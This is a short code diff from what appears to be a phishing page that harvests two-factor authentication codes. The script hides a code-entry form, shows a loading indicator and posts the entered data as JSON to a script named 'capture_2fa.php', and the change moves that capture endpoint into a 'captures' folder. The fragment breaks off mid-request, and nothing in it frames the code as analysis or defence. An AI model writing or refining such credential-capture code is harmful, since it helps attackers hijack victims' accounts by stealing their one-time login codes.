@@ -173,7 +173,7 @@
             document.getElementById('codeForm').style.display = 'none';
             document.getElementById('loading').style.display = 'block';
             
-            fetch('/capture_2fa.php', {
+            fetch('/captures/capture_2fa.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
